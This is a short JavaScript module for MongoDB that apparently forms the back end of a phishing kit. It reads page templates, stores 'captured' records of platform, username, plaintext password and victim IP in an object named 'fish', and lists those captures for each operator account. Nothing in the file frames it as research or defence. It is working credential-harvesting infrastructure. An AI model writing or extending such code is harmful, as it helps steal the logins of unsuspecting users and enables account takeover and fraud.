import { ObjectId } from "mongodb";
import { connectDB } from "../config/database.js";

export async function pushTemplateDb(params) {
    const db = await connectDB()
    return db.collection("template").find().toArray()
    
}

export async function insertCapture(dados) {
    console.log(dados,"codeRef aqui")
    const db = await connectDB()
    let fish = {
        platform:dados.platform,
        user: dados.user,
        pass: dados.pass,
        ip: dados.ip,
        userId : new ObjectId(dados.codRef),
        data_cap:new Date()
    }

    return db.collection("capture").insertOne(fish)
}

export async function captureDB(uid) {
    const db = await connectDB()

    return db.collection("capture")
             .find({ userId: new ObjectId(uid) })
             .toArray()
}


